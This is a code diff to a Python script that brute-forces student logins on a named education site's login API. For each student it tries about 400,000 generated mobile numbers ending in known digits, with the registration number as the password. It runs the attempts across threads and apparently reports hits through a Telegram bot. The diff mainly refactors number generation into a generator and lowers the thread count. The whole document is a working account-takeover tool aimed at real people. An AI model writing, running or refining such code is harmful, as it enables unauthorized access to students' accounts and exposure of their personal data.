@@ -12,7 +12,7 @@ CHAT_ID = os.environ.get("CHAT_ID", "1634075045")
 
 API_URL = "https://www.eduintern.in/api/auth/login"
 FILE_NAME = "students.txt" 
-THREADS = 20 
+THREADS = 10  # Threads kam kar diye taaki server hang na ho
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -25,7 +25,7 @@ HEADERS = {
 live_logs = []
 current_reg = "Starting..."
 total_scanned = 0
-total_to_scan = 250000 # Estimated number of valid prefixes
+total_to_scan = 0
 
 def add_log(text):
     global live_logs
@@ -41,53 +41,56 @@ def send_telegram_msg(text):
 
 def check(phone, password):
     try:
-        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
+        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=10)
         data = r.json() if r.text else {}
         success = "student" in data or "user" in data or ("token" in data and "name" in data)
         return {"status": r.status_code, "success": success, "phone": phone}
     except Exception:
         return {"status": "ERROR", "success": False, "phone": phone}
 
-def process_student(index, reg_no, last4):
-    global current_reg, total_scanned, total_to_scan
-    current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
-    total_scanned = 0
-    
-    add_log("==========================================")
-    add_log(f"TARGET START: {reg_no} (Ending: {last4})")
-    add_log("==========================================")
-    
-    # SMART BIHTAR/JHARKHAND PRIORITY LIST
-    # Top priority series (Jio/Airtel/Vi in Bihar)
+# NUMBER GENERATOR (RAM ME LOAD NAHI HOGA)
+def generate_numbers(last4):
     priority_1 = ['98', '97', '88', '70', '77', '84', '85', '91']
     priority_2 = ['89', '90', '93', '96', '80', '81', '82', '83', '86', '87']
     priority_3 = ['99', '72', '73', '74', '75', '76', '78', '79', '94', '95']
     priority_4 = ['60', '61', '62', '63', '64', '65', '66', '67', '68', '69']
     
-    prefixes = []
-    
-    # Generate prefixes in priority order
     for p_list in [priority_1, priority_2, priority_3, priority_4]:
         for series in p_list:
-            for i in range(10000): # 2 digit + 4 digit (0000-9999) = 6 digit prefix
-                prefixes.append(f"{series}{i:04d}")
+            for i in range(10000):
+                yield f"{series}{i:04d}{last4}"
                 
-    # Add remaining valid numbers (if any left)
-    all_valid = set(prefixes)
+    all_valid = set()
+    for p_list in [priority_1, priority_2, priority_3, priority_4]:
+        for series in p_list:
+            for i in range(10000):
+                all_valid.add(f"{series}{i:04d}")
+                
     for digit in ['6', '7', '8', '9']:
         for i in range(100000):
             prefix = f"{digit}{i:05d}"
             if prefix not in all_valid:
-                # Skip fake patterns like 77777, 99999
-                if len(set(prefix)) > 2: # Kam se kam 3 alag digits ho
-                    prefixes.append(prefix)
-                    
-    total_to_scan = len(prefixes)
+                if len(set(prefix)) > 2:
+                    yield f"{prefix}{last4}"
+
+def process_student(index, reg_no, last4):
+    global current_reg, total_scanned, total_to_scan
+    current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
+    total_scanned = 0
+    total_to_scan = 399968 # Approx
+    
+    add_log("==========================================")
+    add_log(f"TARGET START: {reg_no} (Ending: {last4})")
+    add_log("==========================================")
+    
     found_phone = None
     pending_phones = []
     
+    # Generator use kar rahe hain taaki RAM full na ho
+    numbers = list(generate_numbers(last4))
+    
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures = {ex.submit(check, prefix + last4, reg_no): prefix for prefix in prefixes}
+        futures = {ex.submit(check, phone, reg_no): phone for phone in numbers}
         
         for future in as_completed(futures):
             total_scanned += 1
@@ -105,7 +108,7 @@ def process_student(index, reg_no, last4):
             if total_scanned % 5000 == 0:
                 add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")
 
-    # No-Skip Retry
+    # Retry
     if not found_phone and pending_phones:
         add_log(f"⏳ Retrying {len(pending_phones)} missed numbers...")
         for p_phone in pending_phones:
